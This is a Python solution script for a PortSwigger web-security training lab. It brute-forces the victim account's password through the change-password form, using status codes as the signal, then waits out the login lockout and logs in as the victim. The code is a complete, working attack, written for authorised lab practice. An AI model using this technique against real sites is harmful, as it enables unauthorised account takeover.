#!/usr/bin/env python3
# Lab: Password brute-force via password change
# Lab-Link: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change
# Difficulty: PRACTITIONER

import requests
import shutil
import sys
import time
import urllib3
from pathlib import Path

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# Proxy settings (uncomment and configure if needed)
# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def login(host, client):
    data = {'username': 'wiener', 'password': 'peter'}
    response = client.post(f'{host}/login', data=data, allow_redirects=False)
    if response.status_code != 302:
        print(f'Login failed: {response.text}')
        sys.exit(-1)


def change_password(host, client, password):
    data = {'username': 'carlos', 'current-password': password, 'new-password-1': password, 'new-password-2': password}
    response = client.post(f'{host}/my-account/change-password', data=data, allow_redirects=False)
    if response.status_code == 200:
        return True
    elif response.status_code != 302:
        print(f'Change password failed: {response.text}')
    return False


def verify_login(host, client, username, password):
    url = f'{host}/login'
    data = {'username': username, 'password': password}
    response = client.post(url, data=data, allow_redirects=True)
    print(f'Verify login response for {username}: {response.status_code}')
    if response.status_code == 200 and f'Your username is: {username}' in response.text:
        return True
    print(f'Verify login failed: {response.text}')
    return False


def wait(s):
    for i in range(0, s):
        msg = f'[ ] Waiting for {s - i} more seconds to expire the brute force protection of the login'
        print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\r', flush=True)
        time.sleep(1)
    msg = f'[+] Waited enough to expire the brute force protection of the login'
    print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\n', flush=True)


def main():
    print('[+] Lab: Password brute-force via password change')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Example: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    password_file = Path.cwd() / 'stuff' / 'candidate_passwords.txt'

    with open(password_file, 'r') as f:
        passwords = [line.strip() for line in f]

    with requests.Session() as client:
        client.verify = False
        # client.proxies = proxies

        print(f'[ ] Attempt password: ', end='\r')

        for password in passwords:
            msg = f'[ ] Try password: {password}'
            print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\r', flush=True)
            login(host, client)
            if change_password(host, client, password):
                msg = f'[+] Found password: {password}'
                print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\n', flush=True)
                print(f'[+] Attempting to login to solve the lab')
                wait(65)  # Wait for 65 seconds to ensure the brute force protection expires
                if verify_login(host, client, 'carlos', password):
                    print(f'[+] Login verified, lab solved')
                    sys.exit(0)
                else:
                    print(f'[-] Failed to verify login')
                    sys.exit(-2)

        print()
        print(f'[-] Failed to brute force the password')


if __name__ == "__main__":
    main()
